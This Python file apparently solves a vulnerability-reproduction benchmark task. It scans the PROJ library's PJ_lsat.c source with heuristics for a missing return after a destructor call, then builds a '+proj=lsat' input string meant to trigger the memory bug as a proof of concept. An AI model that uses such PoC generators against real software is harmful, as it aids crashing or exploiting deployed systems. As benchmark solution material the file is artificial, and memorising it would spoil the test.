import os
import re
import tarfile
import tempfile
from typing import Dict, List, Optional, Tuple


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    base = os.path.realpath(path)
    for member in tar.getmembers():
        member_path = os.path.realpath(os.path.join(path, member.name))
        if not member_path.startswith(base + os.sep) and member_path != base:
            continue
        try:
            tar.extract(member, path=path)
        except Exception:
            pass


def _strip_c_comments(src: str) -> str:
    out = []
    i = 0
    n = len(src)
    state = 0  # 0 code, 1 line comment, 2 block comment, 3 string, 4 char
    while i < n:
        ch = src[i]
        if state == 0:
            if ch == '/' and i + 1 < n and src[i + 1] == '/':
                out.append(' ')
                out.append(' ')
                i += 2
                state = 1
                continue
            if ch == '/' and i + 1 < n and src[i + 1] == '*':
                out.append(' ')
                out.append(' ')
                i += 2
                state = 2
                continue
            if ch == '"':
                out.append(ch)
                i += 1
                state = 3
                continue
            if ch == "'":
                out.append(ch)
                i += 1
                state = 4
                continue
            out.append(ch)
            i += 1
        elif state == 1:
            if ch == '\n':
                out.append('\n')
                i += 1
                state = 0
            else:
                out.append(' ')
                i += 1
        elif state == 2:
            if ch == '*' and i + 1 < n and src[i + 1] == '/':
                out.append(' ')
                out.append(' ')
                i += 2
                state = 0
            else:
                out.append('\n' if ch == '\n' else ' ')
                i += 1
        elif state == 3:
            out.append(ch)
            if ch == '\\' and i + 1 < n:
                out.append(src[i + 1])
                i += 2
                continue
            if ch == '"':
                state = 0
            i += 1
        else:  # state == 4
            out.append(ch)
            if ch == '\\' and i + 1 < n:
                out.append(src[i + 1])
                i += 2
                continue
            if ch == "'":
                state = 0
            i += 1
    return ''.join(out)


def _find_file(root: str, target_basename: str) -> Optional[str]:
    target_lower = target_basename.lower()
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn.lower() == target_lower:
                return os.path.join(dirpath, fn)
    return None


def _find_any_fuzzer(root: str) -> bool:
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn.endswith(('.c', '.cc', '.cpp', '.cxx')):
                fp = os.path.join(dirpath, fn)
                try:
                    with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                        s = f.read()
                    if 'LLVMFuzzerTestOneInput' in s:
                        return True
                except Exception:
                    continue
    return False


def _find_matching_brace(text: str, open_brace_idx: int) -> Optional[int]:
    n = len(text)
    depth = 1
    i = open_brace_idx + 1
    state = 0  # 0 code, 1 string, 2 char
    while i < n:
        ch = text[i]
        if state == 0:
            if ch == '"':
                state = 1
                i += 1
                continue
            if ch == "'":
                state = 2
                i += 1
                continue
            if ch == '{':
                depth += 1
            elif ch == '}':
                depth -= 1
                if depth == 0:
                    return i
            i += 1
        elif state == 1:
            if ch == '\\' and i + 1 < n:
                i += 2
                continue
            if ch == '"':
                state = 0
            i += 1
        else:
            if ch == '\\' and i + 1 < n:
                i += 2
                continue
            if ch == "'":
                state = 0
            i += 1
    return None


def _compute_line_starts(text: str) -> List[int]:
    starts = [0]
    i = 0
    while True:
        j = text.find('\n', i)
        if j < 0:
            break
        starts.append(j + 1)
        i = j + 1
    return starts


def _pos_to_line(line_starts: List[int], pos: int) -> int:
    lo, hi = 0, len(line_starts) - 1
    while lo <= hi:
        mid = (lo + hi) // 2
        if line_starts[mid] <= pos:
            lo = mid + 1
        else:
            hi = mid - 1
    return max(0, hi)


def _extract_pj_functions(clean_text: str) -> List[Tuple[str, int, int, int, int]]:
    # returns list of (name, start_pos, end_pos, start_line, end_line)
    funcs = []
    line_starts = _compute_line_starts(clean_text)

    patterns = [
        re.compile(r'\b(?:static\s+)?PJ\s*\*\s*([A-Za-z_]\w*)\s*\([^;{}]*\)\s*\{', re.M),
        re.compile(r'\bPJ\s*\*\s*PROJECTION\s*\(\s*([A-Za-z_]\w*)\s*\)\s*\{', re.M),
    ]
    for pat in patterns:
        for m in pat.finditer(clean_text):
            name = m.group(1)
            open_brace_idx = clean_text.find('{', m.end() - 1)
            if open_brace_idx < 0:
                continue
            close_brace_idx = _find_matching_brace(clean_text, open_brace_idx)
            if close_brace_idx is None:
                continue
            start_line = _pos_to_line(line_starts, open_brace_idx)
            end_line = _pos_to_line(line_starts, close_brace_idx)
            funcs.append((name, open_brace_idx, close_brace_idx, start_line, end_line))
    # Deduplicate by span
    uniq = {}
    for f in funcs:
        key = (f[1], f[2], f[0])
        uniq[key] = f
    return list(uniq.values())


def _function_body(clean_text: str, func: Tuple[str, int, int, int, int]) -> str:
    _, ob, cb, _, _ = func
    return clean_text[ob + 1:cb]


def _ends_with_return_stmt(body: str) -> bool:
    tail = body.rstrip()
    if not tail:
        return False
    # Remove trailing braces/spaces/semicolons
    while tail and tail[-1] in ' \t\r\n;':
        tail = tail[:-1]
    tail = tail.rstrip()
    # Find last statement boundary
    last_nl = tail.rfind('\n')
    last_part = tail[last_nl + 1:].strip() if last_nl >= 0 else tail.strip()
    if last_part.startswith('return'):
        return True
    # Also check if last meaningful token starts with "return" after possible label
    if re.match(r'^[A-Za-z_]\w*:\s*return\b', last_part):
        return True
    return False


def _has_destructor_assignment(clean_text: str, func_name: str) -> bool:
    # Typical patterns in PROJ:
    # P->destructor = freeup;
    # P->pfree = freeup;
    # P->destructor = pj_default_destructor;
    pat = re.compile(r'(->\s*(?:destructor|pfree)\s*=\s*' + re.escape(func_name) + r'\s*;)', re.M)
    return pat.search(clean_text) is not None


def _extract_param_specs(clean_text: str) -> Dict[str, str]:
    # map key -> typechar (first letter in spec string)
    specs: Dict[str, str] = {}
    for m in re.finditer(r'pj_param\s*\([^"]*"\s*([a-zA-Z])([A-Za-z0-9_]+)\s*"\s*\)', clean_text):
        t = m.group(1)
        key = m.group(2)
        if key not in specs:
            specs[key] = t
    return specs


def _extract_required_keys(clean_text: str) -> Dict[str, str]:
    # keys that appear in explicit negated checks (likely required)
    req: Dict[str, str] = {}
    for m in re.finditer(r'!\s*pj_param\s*\([^"]*"\s*([a-zA-Z])([A-Za-z0-9_]+)\s*"\s*\)', clean_text):
        t = m.group(1)
        key = m.group(2)
        if key not in req:
            req[key] = t
    return req


def _find_suspicious_missing_return_calls(clean_text: str) -> List[int]:
    lines = clean_text.splitlines()
    suspicious_lines: List[int] = []
    for i, line in enumerate(lines):
        if 'pj_default_destructor' in line:
            idx = line.find('pj_default_destructor')
            before = line[:idx]
            # rough statement-level check
            stmt_start = max(before.rfind(';'), before.rfind('{'), before.rfind('}'))
            if stmt_start >= 0:
                before_stmt = before[stmt_start + 1:]
            else:
                before_stmt = before
            if re.search(r'\breturn\b', before_stmt) is None:
                suspicious_lines.append(i)
        if re.search(r'\bfreeup\s*\(', line) and 'return' not in line:
            # ignore function definition lines
            if re.search(r'\bPJ\s*\*\s*freeup\s*\(', line) is None and re.search(r'\bstatic\s+PJ\s*\*\s*freeup\s*\(', line) is None:
                suspicious_lines.append(i)
    return suspicious_lines


def _line_context(lines: List[str], idx: int, k: int = 5) -> str:
    a = max(0, idx - k)
    b = min(len(lines), idx + 1)
    return "\n".join(lines[a:b])


def _choose_invalid_param_from_context(ctx: str, known_keys: List[str]) -> Tuple[Optional[str], Optional[int]]:
    # Prefer keys in ctx among known_keys
    ctx_lower = ctx.lower()
    key = None
    for cand in ['lsat', 'path']:
        if cand in known_keys and cand in ctx_lower:
            key = cand
            break
    if key is None:
        for k in known_keys:
            if k.lower() in ctx_lower:
                key = k
                break
    if key is None:
        return None, None

    # Find a suitable failing value based on comparisons in ctx
    # Accept patterns with either variable name or member access containing the key
    # We'll scan for comparisons involving words that contain the key.
    var_patterns = [
        re.compile(r'([A-Za-z_]\w*(?:->\w+)*)\s*([<>]=?)\s*([0-9]+)'),
        re.compile(r'([0-9]+)\s*([<>]=?)\s*([A-Za-z_]\w*(?:->\w+)*)'),
    ]

    chosen_val: Optional[int] = None
    for pat in var_patterns:
        for m in pat.finditer(ctx):
            a, op, b = m.group(1), m.group(2), m.group(3)
            if pat is var_patterns[0]:
                var = a
                num = int(b)
                if key.lower() not in var.lower():
                    continue
                if op == '<':
                    chosen_val = max(0, num - 1)
                elif op == '<=':
                    chosen_val = num + 1
                elif op == '>':
                    chosen_val = num + 1
                elif op == '>=':
                    chosen_val = max(0, num - 1)
            else:
                num = int(a)
                var = b
                if key.lower() not in var.lower():
                    continue
                # num < var means var > num; violate by var = num
                if op == '<':
                    chosen_val = num
                elif op == '<=':
                    chosen_val = num
                elif op == '>':
                    chosen_val = num
                elif op == '>=':
                    chosen_val = num
            if chosen_val is not None:
                return key, chosen_val

    # Fallback: pick an obviously invalid value for common keys
    if key.lower() in ('lsat', 'path'):
        return key, 0
    return key, 0


def _build_proj_string(keys_types: Dict[str, str], make_invalid_key: Optional[str], invalid_value: Optional[int]) -> bytes:
    def add_kv(tokens: List[str], k: str, v: str) -> None:
        tokens.append('+' + k + '=' + v)

    tokens: List[str] = ['+proj=lsat']

    # Always include lsat/path if present in file; else include both anyway to be safe
    want_keys: List[str] = []
    if 'lsat' in keys_types:
        want_keys.append('lsat')
    if 'path' in keys_types:
        want_keys.append('path')
    if not want_keys:
        want_keys = ['lsat', 'path']

    # Add any other keys that look required (from negated checks) and are not standard ellipsoid params
    other_keys = []
    for k in keys_types.keys():
        if k in ('lsat', 'path', 'a', 'b', 'R', 'ellps', 'datum', 'no_defs'):
            continue
        other_keys.append(k)
    other_keys.sort()

    def emit_key(k: str) -> None:
        t = keys_types.get(k, 'i')
        if t.lower() == 't':
            # flag
            tokens.append('+' + k)
            return
        if t.lower() == 's':
            val = 'a'
        elif t.lower() in ('r', 'd', 'f'):
            val = '0'
        else:
            if make_invalid_key is not None and k == make_invalid_key and invalid_value is not None:
                val = str(int(invalid_value))
            else:
                val = '1'
        add_kv(tokens, k, val)

    for k in want_keys:
        emit_key(k)

    # If we chose to invalidate a key not in want_keys, add it
    if make_invalid_key is not None and make_invalid_key not in want_keys:
        emit_key(make_invalid_key)

    # Ellipsoid to ensure projection init reaches projection-specific code
    add_kv(tokens, 'a', '1')
    add_kv(tokens, 'b', '1')

    s = ' '.join(tokens)
    return s.encode('ascii', errors='ignore')


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = None
        root = src_path
        try:
            if os.path.isfile(src_path):
                tmpdir = tempfile.mkdtemp(prefix="arvo_pj_")
                try:
                    with tarfile.open(src_path, 'r:*') as tf:
                        _safe_extract_tar(tf, tmpdir)
                    root = tmpdir
                except Exception:
                    root = tmpdir

            pj_lsat = _find_file(root, "PJ_lsat.c")
            if pj_lsat is None:
                pj_lsat = _find_file(root, "pj_lsat.c")

            # Default PoC (valid)
            default_keys_types = {'lsat': 'i', 'path': 'i'}
            best = _build_proj_string(default_keys_types, None, None)

            if pj_lsat is None:
                return best

            try:
                with open(pj_lsat, 'r', encoding='utf-8', errors='ignore') as f:
                    raw = f.read()
            except Exception:
                return best

            clean = _strip_c_comments(raw)

            keys_types = _extract_param_specs(clean)
            if 'lsat' not in keys_types:
                keys_types['lsat'] = 'i'
            if 'path' not in keys_types:
                keys_types['path'] = 'i'

            funcs = _extract_pj_functions(clean)
            suspicious_lines = _find_suspicious_missing_return_calls(clean)
            lines = clean.splitlines()

            # Decide if vulnerability likely triggers on destroy (valid input) or on init error (invalid input)
            # Heuristic 1: missing return at end of a destructor-like function used as destructor
            destroy_mode = False
            for func in funcs:
                name = func[0]
                body = _function_body(clean, func)
                if name.lower() in ('freeup', 'pj_freeup') or 'freeup' in name.lower():
                    if not _ends_with_return_stmt(body) and _has_destructor_assignment(clean, name):
                        destroy_mode = True
                        break

            fuzz_harness_present = _find_any_fuzzer(root)

            make_invalid_key = None
            invalid_value = None

            if not destroy_mode:
                # Heuristic 2: find a pj_default_destructor/freeup call without return, likely needs invalid input to reach it
                chosen_ctx = None
                if suspicious_lines:
                    idx = suspicious_lines[0]
                    chosen_ctx = _line_context(lines, idx, k=6)
                if chosen_ctx:
                    known_keys = list(keys_types.keys())
                    make_invalid_key, invalid_value = _choose_invalid_param_from_context(chosen_ctx, known_keys)

                # Only use invalid path if we have a hint and a fuzz harness is likely (to avoid nonzero exits in CLI tools)
                if make_invalid_key is not None and fuzz_harness_present:
                    pass
                else:
                    make_invalid_key, invalid_value = None, None

            return _build_proj_string(keys_types, make_invalid_key, invalid_value)
        finally:
            if tmpdir is not None:
                try:
                    for dirpath, dirnames, filenames in os.walk(tmpdir, topdown=False):
                        for fn in filenames:
                            try:
                                os.unlink(os.path.join(dirpath, fn))
                            except Exception:
                                pass
                        for dn in dirnames:
                            try:
                                os.rmdir(os.path.join(dirpath, dn))
                            except Exception:
                                pass
                    os.rmdir(tmpdir)
                except Exception:
                    pass